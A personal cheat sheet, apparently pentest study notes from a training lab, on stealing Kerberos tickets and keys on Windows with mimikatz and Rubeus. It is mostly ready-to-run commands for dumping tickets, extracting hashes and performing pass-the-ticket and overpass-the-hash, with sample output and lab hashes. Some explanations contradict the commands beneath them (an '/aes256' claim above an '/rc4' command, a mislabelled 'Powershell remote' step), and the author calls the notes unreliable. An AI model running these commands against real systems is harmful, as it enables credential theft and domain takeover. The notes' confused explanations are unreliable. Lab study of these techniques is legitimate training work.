# Windows target

We are looting kerberos tickets on windows. We can use tools like `rubeus` or `mimikatz` to extract from memory

> Note: I don't even know what's in half of these. I keep bad notes and I never want to look back at this...

## Mimikatz

### Export kerberos tickets

```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
```

Sample. Mimikatz will export all tickets to files on current directory

```
07/05/2025  03:30 PM             1,703 [0;3e4]-0-0-40a50000-MS01$@DNS-dc01.inlanefreight.htb.kirbi
07/05/2025  03:30 PM             1,705 [0;3e4]-0-1-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi
07/05/2025  03:30 PM             1,633 [0;3e4]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
07/05/2025  03:30 PM             1,633 [0;3e4]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
07/05/2025  03:30 PM             1,743 [0;3e7]-0-0-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi
07/05/2025  03:30 PM             1,659 [0;3e7]-0-1-40a50000.kirbi
07/05/2025  03:30 PM             1,705 [0;3e7]-0-2-40a50000-MS01$@LDAP-DC01.inlanefreight.htb.kirbi
07/05/2025  03:30 PM             1,743 [0;3e7]-0-3-40a50000-MS01$@ldap-DC01.inlanefreight.htb.kirbi
07/05/2025  03:30 PM             1,633 [0;3e7]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
07/05/2025  03:30 PM             1,633 [0;3e7]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
07/05/2025  03:30 PM             1,641 [0;49155]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi
07/05/2025  03:30 PM             1,623 [0;49b21]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
07/05/2025  03:30 PM             1,633 [0;4a45c]-2-0-40e10000-david@krbtgt-INLANEFREIGHT.HTB.kirbi
```

In this sample:

- `[0;3e7]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi` is a computer account, which needs a ticket to interact with the Active Directory. `MS01$@krbtgt` means this ticket is a TGT ticket of that computer account.
- `[0;49155]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi` is a user's ticket. Same thing, `julio@krbtgt` means this ticket is a TGT ticket of that user account.
- `[0;3e7]-0-0-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi` is a TGS ticket. This ticket can only be used for 1 specific service, in this case, `SMB`

### Pass the Ticket

This will create a `cmd` session for you without quitting `mimikatz`

```cmd
.\mimikatz.exe

mimikatz # kerberos::ptt "C:\path\to\ticket"
mimikatz # misc::cmd
```

Or, Powershell remote with the imported ticket

```cmd
.\mimikatz.exe

mimikatz # kerberos::ptt "C:\path\to\ticket"
mimikatz # exit

powershell
Enter-PSSession -ComputerName DC01
```

### Pass the Key aka. OverPass the Hash

Extract key first:

```cmd
.\mimikatz.exe

mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Sample:

```
Authentication Id : 0 ; 444066 (00000000:0006c6a2)
Session           : Interactive from 1
User Name         : plaintext
Domain            : HTB
Logon Server      : DC01
Logon Time        : 7/12/2022 9:42:15 AM
SID               : S-1-5-21-228825152-3134732153-3833540767-1107

         * Username : plaintext
         * Domain   : inlanefreight.htb
         * Password : (null)
         * Key List :
           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
```

Copy the `rc4` hash, then do pass the key

```cmd
mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

## Rubeus

### Export kerberos tickets

```cmd
.\Rubeus.exe dump /nowrap
```

### Pass the Ticket

The hash can be `/rc4`, `/aes128`, `/aes256`, or `/des`. In this example, we use `/aes256`.

Yes, you get the hash from `mimikatz`. At least that's what I was taught.

```cmd-session
.\Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

Or, we can use the ticket we exported from `mimikatz`

```cmd
.\Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

Powershell remote with the imported ticket

```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

### Pass the Key aka. OverPass the Hash

The hash can be `/rc4`, `/aes128`, `/aes256`, or `/des`. In this example, we use `/aes256`.

Yes, you get the hash from `mimikatz`. At least that's what I was taught.

```cmd
.\Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
